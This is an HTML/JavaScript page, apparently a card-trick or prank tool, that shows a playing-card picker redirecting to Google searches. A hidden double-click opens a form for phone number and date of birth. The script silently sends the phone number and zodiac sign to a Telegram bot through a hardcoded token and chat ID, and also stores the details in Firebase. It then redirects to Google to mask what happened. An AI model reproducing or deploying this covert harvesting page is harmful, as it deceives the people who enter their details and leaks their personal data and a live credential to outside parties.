<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Interactive Gateway</title>
<!-- Tailwind CSS CDN for styling -->
<script src="https://cdn.tailwindcss.com"></script>
<style>
/* Ensure the body and html take up the full screen */
html, body {
height: 100%;
margin: 0;
overflow: hidden; /* Prevent scrolling */
}
/* Styles for the main modal container/backdrop */
.modal-container {
display: flex;
position: fixed;
inset: 0;
align-items: center;
justify-content: center;
z-index: 20;
}
.hidden {
display: none !important;
}
/* Styles for the ghost buttons */
.ghost-btn {
background-color: transparent;
border: 2px solid white;
color: white;
transition: all 0.1s ease-in-out;
}
.ghost-btn:hover {
background-color: white;
color: black;
}
.ghost-btn.suit-red {
border-color: #ef4444;
color: #ef4444;
}
.ghost-btn.suit-red:hover {
background-color: #ef4444;
color: white;
}
/* Floating Console Styling */
.floating-console {
    position: fixed;
    bottom: 1rem;
    left: 1rem;
    width: 90%;
    max-width: 350px;
    max-height: 200px;
    background-color: rgba(0, 0, 0, 0.7);
    color: white;
    font-family: monospace;
    font-size: 10px;
    padding: 0.5rem;
    border-radius: 0.5rem;
    overflow-y: auto;
    z-index: 9999;
    border: 1px solid #333;
}
.console-header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-bottom: 0.5rem;
}
.console-header button {
    background: #ef4444;
    color: white;
    border: none;
    padding: 0.25rem 0.5rem;
    border-radius: 0.25rem;
    cursor: pointer;
    font-size: 10px;
}
.console-output {
    word-wrap: break-word;
    white-space: pre-wrap;
}
</style>
</head>
<body class="bg-black">

<!-- Card Keypad (Visible by default) -->
<div id="cardKeypad" class="modal-container">
<div class="w-full max-w-xs bg-black rounded-2xl p-6">
<h3 id="keypadTitle" class="text-white text-xl text-center font-bold mb-4">Select a Value</h3>
<div id="selectionContainer" class="grid grid-cols-3 gap-2">
<!-- Card buttons will be generated here -->
</div>
</div>
</div>

<!-- User Info Modal (Initially Hidden) -->
<div id="infoModal" class="modal-container hidden">
<div class="bg-black p-8 rounded-xl max-w-sm w-full m-4">
<h2 class="text-2xl font-bold mb-6 text-center text-white">Enter Your Details</h2>
<div class="mb-4">
<label for="phoneNumberInput" class="block text-sm font-medium text-gray-400 mb-1 text-left">Phone Number</label>
<input type="tel" id="phoneNumberInput" placeholder="Enter at least 10 digits" class="w-full p-3 bg-transparent border border-gray-600 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500 text-white placeholder-gray-500"/>
</div>
<div class="mb-4">
<label for="dobInput" class="block text-sm font-medium text-gray-400 mb-1 text-left">Date of Birth</label>
<input type="text" id="dobInput" placeholder="MM/DD/YYYY" class="w-full p-3 bg-transparent border border-gray-600 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500 text-white placeholder-gray-500"/>
</div>
</div>
</div>

<!-- Floating Console -->
<div id="floatingConsole" class="floating-console">
    <div class="console-header">
        <span>Console</span>
        <button id="clearConsoleBtn">Clear</button>
    </div>
    <div id="consoleOutput" class="console-output"></div>
</div>

<script type="module">
// Import Firebase modules
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.3/firebase-app.js";
import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.12.3/firebase-database.js";

// --- Firebase Configuration ---
// Gunakan konfigurasi dari lingkungan Canvas jika tersedia.
// Jika tidak, Anda bisa memasukkan kredensial dari Vercel Anda di sini secara manual.
let firebaseConfig = null;
if (typeof __firebase_config !== 'undefined' && __firebase_config) {
    try {
        firebaseConfig = JSON.parse(__firebase_config);
        console.log("Menggunakan konfigurasi Firebase dari lingkungan Canvas.");
    } catch (e) {
        console.error("Gagal mengurai konfigurasi Firebase dari Canvas.", e);
    }
} else {
    // --- TEMPAT ANDA BISA MENYALIN KREDENSIAL VERCEL SECARA MANUAL ---
    // Hapus bagian ini di Vercel jika Anda menggunakan variabel lingkungan
    // firebaseConfig = {
    //     apiKey: "YOUR_VITE_FIREBASE_API_KEY",
    //     authDomain: "YOUR_VITE_FIREBASE_AUTH_DOMAIN",
    //     projectId: "YOUR_VITE_FIREBASE_PROJECT_ID",
    //     storageBucket: "YOUR_VITE_FIREBASE_STORAGE_BUCKET",
    //     messagingSenderId: "YOUR_VITE_FIREBASE_MESSAGING_SENDER_ID",
    //     appId: "YOUR_VITE_FIREBASE_APP_ID"
    // };
    console.warn("Konfigurasi Firebase tidak ditemukan di lingkungan. Operasi penyimpanan data akan dilewati.");
}

let database = null;
if (firebaseConfig) {
    try {
        const app = initializeApp(firebaseConfig);
        database = getDatabase(app);
        console.log("Firebase berhasil diinisialisasi.");
    } catch (e) {
        console.error("Gagal menginisialisasi Firebase:", e);
    }
}

// --- Element References ---
const cardKeypad = document.getElementById('cardKeypad');
const infoModal = document.getElementById('infoModal');
const phoneNumberInput = document.getElementById('phoneNumberInput');
const dobInput = document.getElementById('dobInput');
const selectionContainer = document.getElementById('selectionContainer');
const keypadTitle = document.getElementById('keypadTitle');
const floatingConsole = document.getElementById('floatingConsole');
const consoleOutput = document.getElementById('consoleOutput');
const clearConsoleBtn = document.getElementById('clearConsoleBtn');

// --- Custom Floating Console Logic ---
const originalConsole = {
    log: console.log,
    warn: console.warn,
    error: console.error,
};

function appendToConsole(message, type = 'log') {
    const p = document.createElement('p');
    const timestamp = new Date().toLocaleTimeString();
    p.textContent = `[${timestamp}] ${message}`;
    if (type === 'error') p.style.color = '#ef4444';
    else if (type === 'warn') p.style.color = '#f59e0b';
    else p.style.color = '#a0aec0';
    consoleOutput.appendChild(p);
    consoleOutput.scrollTop = consoleOutput.scrollHeight; // Scroll to bottom
}

console.log = (...args) => {
    originalConsole.log(...args);
    appendToConsole(args.map(arg => typeof arg === 'object' ? JSON.stringify(arg) : arg).join(' '), 'log');
};

console.warn = (...args) => {
    originalConsole.warn(...args);
    appendToConsole(args.map(arg => typeof arg === 'object' ? JSON.stringify(arg) : arg).join(' '), 'warn');
};

console.error = (...args) => {
    originalConsole.error(...args);
    appendToConsole(args.map(arg => typeof arg === 'object' ? JSON.stringify(arg) : arg).join(' '), 'error');
};

clearConsoleBtn.addEventListener('click', () => {
    consoleOutput.innerHTML = '';
});

// --- Telegram API Config ---
const TELEGRAM_BOT_TOKEN = '7639651359:AAF4XflfPvNvT6ku5APx3bSuzzbyG2cB_FY';
const TELEGRAM_CHAT_ID = '8126543908';

// --- State Management ---
let inactivityTimer;

// --- Inactivity Logic ---
function handleVisibilityChange() {
if (document.visibilityState === 'hidden') {
inactivityTimer = setTimeout(() => { window.location.replace('https://www.google.com'); }, 5000);
} else {
clearTimeout(inactivityTimer);
}
}
document.addEventListener('visibilitychange', handleVisibilityChange);

// --- Validation and Calculation Functions ---
function isValidPhoneNumber(number) { return number.replace(/\D/g, '').length > 9; }
function isValidDOB(dateString) { return /^(0[1-9]|1[0-2])\/(0[1-9]|[12][0-9]|3[01])\/\d{4}$/.test(dateString); }

function getZodiacSign(dob) {
const [month, day] = dob.split('/').map(Number);
if ((month == 1 && day >= 20) || (month == 2 && day <= 18)) return "Aquarius";
if ((month == 2 && day >= 19) || (month == 3 && day <= 20)) return "Pisces";
if ((month == 3 && day >= 21) || (month == 4 && day <= 19)) return "Aries";
if ((month == 4 && day >= 20) || (month == 5 && day <= 20)) return "Taurus";
if ((month == 5 && day >= 21) || (month == 6 && day <= 20)) return "Gemini";
if ((month == 6 && day >= 21) || (month == 7 && day <= 22)) return "Cancer";
if ((month == 7 && day >= 23) || (month == 8 && day <= 22)) return "Leo";
if ((month == 8 && day >= 23) || (month == 9 && day <= 22)) return "Virgo";
if ((month == 9 && day >= 23) || (month == 10 && day <= 22)) return "Libra";
if ((month == 10 && day >= 23) || (month == 11 && day <= 21)) return "Scorpio";
if ((month == 11 && day >= 22) || (month == 12 && day <= 21)) return "Sagittarius";
if ((month == 12 && day >= 22) || (month == 1 && day <= 19)) return "Capricorn";
return "Unknown";
}

// --- API and Redirect Functions ---
async function sendToTelegram(zodiac, phone) {
const message = `${zodiac}\n${phone}`;
const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
try {
await fetch(url, {
method: 'POST',
headers: { 'Content-Type': 'application/json' },
body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message }),
});
} catch (error) {
console.error("Failed to send message to Telegram:", error);
}
}

function redirectToGoogle(query) {
const url = `https://www.google.com/search?q=${encodeURIComponent(query)}`;
window.location.replace(url);
}

// --- Main Application Flow ---
async function handleZodiacSubmission() {
const phone = phoneNumberInput.value;
const dob = dobInput.value;
const zodiac = getZodiacSign(dob);

const userData = {
phoneNumber: phone,
dateOfBirth: dob,
zodiacSign: zodiac,
timestamp: new Date().toISOString()
};

// Check if Firebase database is initialized before pushing
if (database) {
  try {
    // Pushing data to Firebase Realtime Database
    await push(ref(database, 'userSubmissions'), userData);
    console.log("Data berhasil disimpan ke Firebase!");
  } catch (error) {
    console.error("Gagal menyimpan data ke Firebase:", error);
  }
} else {
  console.warn("Firebase database not initialized. Skipping data storage.");
}

await sendToTelegram(zodiac, phone);
redirectToGoogle(zodiac);
}

function triggerInfoModal(event) {
if (event.target === cardKeypad) {
cardKeypad.classList.add('hidden');
infoModal.classList.remove('hidden');
phoneNumberInput.focus();
cardKeypad.removeEventListener('dblclick', triggerInfoModal);
}
}

// --- DYNAMIC KEYPAD LOGIC ---
function displayRanks() {
selectionContainer.innerHTML = '';
selectionContainer.className = 'grid grid-cols-3 gap-2';
keypadTitle.textContent = 'Select a Value';
const ranks = ['A', '2', '3', '4', '5', '6', '7', '8', '9', '10', 'J', 'Q', 'K'];
ranks.forEach(rank => {
const btn = document.createElement('button');
let classes = 'ghost-btn font-bold rounded-lg flex items-center justify-center py-4';
if (rank === 'K') classes += ' col-span-3';
btn.className = classes;
btn.textContent = rank;
btn.onclick = () => displaySuits(rank);
selectionContainer.appendChild(btn);
});
}

function displaySuits(selectedRank) {
selectionContainer.innerHTML = '';
selectionContainer.className = 'grid grid-cols-2 gap-2';
const rankName = ({ 'A': 'Ace', 'K': 'King', 'Q': 'Queen', 'J': 'Jack' })[selectedRank] || selectedRank;
keypadTitle.textContent = `${rankName} - Select a Suit`;

const suits = ['♠', '♥', '♦', '♣'];
suits.forEach(suit => {
const btn = document.createElement('button');
let classes = 'ghost-btn text-4xl font-bold rounded-lg flex items-center justify-center py-4';
if (suit === '♥' || suit === '♦') classes += ' suit-red';
btn.className = classes;
btn.textContent = suit;
btn.onclick = () => {
const suitMap = { '♠': 'Spades', '♥': 'Hearts', '♦': 'Diamonds', '♣': 'Clubs' };
const query = `${rankName} of ${suitMap[suit]}`;
redirectToGoogle(query);
};
selectionContainer.appendChild(btn);
});
}

// --- Event Listeners ---
cardKeypad.addEventListener('dblclick', triggerInfoModal);
phoneNumberInput.addEventListener('input', () => {
if (isValidPhoneNumber(phoneNumberInput.value)) dobInput.focus();
});
dobInput.addEventListener('input', () => {
if (isValidDOB(dobInput.value) && isValidPhoneNumber(phoneNumberInput.value)) {
handleZodiacSubmission();
}
});

// --- Initial Setup ---
displayRanks(); // Start with the functional keypad
</script>
</body>
</html>
